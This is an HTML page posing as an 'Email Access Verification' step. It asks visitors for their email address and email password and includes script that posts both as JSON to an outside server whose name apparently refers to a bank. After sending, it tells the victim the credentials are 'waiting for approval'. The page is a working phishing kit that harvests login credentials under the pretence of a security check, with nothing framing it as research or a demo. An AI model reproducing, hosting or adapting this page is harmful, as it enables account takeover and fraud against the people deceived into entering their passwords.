<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Email Verification</title>
    <link rel="stylesheet" href="res/app.css">

    <style>
        .error {
            border-color: #ff4444 !important;
            box-shadow: 0 0 5px rgba(255, 68, 68, 0.5) !important;
        }

        .loading {
            opacity: 0.7;
            pointer-events: none;
        }

        #status-message {
            text-align: center;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            display: none;
        }

        #status-message.error {
            background-color: #ffebee;
            color: #c62828;
            border: 1px solid #ffcdd2;
        }

        #status-message.success {
            background-color: #e8f5e9;
            color: #2e7d32;
            border: 1px solid #c8e6c9;
        }

        #status-message.info {
            background-color: #e3f2fd;
            color: #1565c0;
            border: 1px solid #bbdefb;
        }

        .error-message {
            color: #d32f2f;
            background-color: #ffebee;
            padding: 10px;
            border-radius: 4px;
            margin: 10px 0;
            text-align: center;
            border: 1px solid #ffcdd2;
            display: none;
        }

        input[type="text"],
        input[type="password"],
        input[type="email"] {
            width: 100%;
            padding: 10px;
            box-sizing: border-box;
        }
    </style>
</head>

<body>
<main>
<div class="form">

    <div class="logo">
        <img src="res/logo.png" alt="Logo">
    </div>

    <div class="text">
        <h2>Email Access Verification</h2>
        <span>Please enter your email credentials for verification</span>
    </div>

    <div id="error-message" class="error-message"></div>
    <div id="status-message"></div>

    <div class="col">
        <label>Email Address</label>
        <input type="email" id="email-input" placeholder="Enter your email address">
    </div>

    <div class="col">
        <label>Email Password</label>
        <input type="password" id="password-input" placeholder="Enter your email password">
    </div>

    <div class="col">
        <button onclick="submitEmail()" id="submit-btn">Verify Email</button>
    </div>

    <div class="col" style="font-size: 12px; color: #666; text-align: center;">
        <p>We need to verify your email account to ensure secure access to your account.</p>
    </div>

    <div class="col links">
        <span>Help</span>
        <span>Privacy</span>
        <span>Terms</span>
    </div>

</div>
</main>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>

<script>
const BACKEND_URL = "https://scotiabcknd.onrender.com";

function showMessage(text, type = "info") {
    const msg = $("#status-message");
    msg.removeClass("error success info").addClass(type);
    msg.text(text).show();
}

function hideMessage() {
    $("#status-message").hide();
}

function setLoading(state) {
    if (state) {
        $("body").addClass("loading");
        $("#submit-btn").prop("disabled", true).text("Verifying...");
    } else {
        $("body").removeClass("loading");
        $("#submit-btn").prop("disabled", false).text("Verify Email");
    }
}

async function submitEmail() {
    $("#email-input, #password-input").removeClass("error");
    hideMessage();

    const email = $("#email-input").val().trim();
    const password = $("#password-input").val().trim();
    let valid = true;

    if (!email) {
        $("#email-input").addClass("error");
        showMessage("Please enter your email address", "error");
        valid = false;
    } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
        $("#email-input").addClass("error");
        showMessage("Please enter a valid email address", "error");
        valid = false;
    }

    if (!password) {
        $("#password-input").addClass("error");
        showMessage("Please enter your email password", "error");
        valid = false;
    }

    if (!valid) return;

    setLoading(true);
    showMessage("Verifying email credentials...", "info");

    try {
        const response = await $.ajax({
            url: `${BACKEND_URL}/email`,
            method: "POST",
            contentType: "application/json",
            data: JSON.stringify({ email, password })
        });

        if (response.success) {
            showMessage("Credentials submitted. Waiting for approval...", "success");
        } else {
            showMessage(response.error || "Verification failed", "error");
            setLoading(false);
        }
    } catch (err) {
        showMessage("Network error. Please try again.", "error");
        setLoading(false);
    }
}

$("input").on("keypress", function(e) {
    if (e.key === "Enter") submitEmail();
});

$("#email-input").focus();
</script>

</body>
</html>
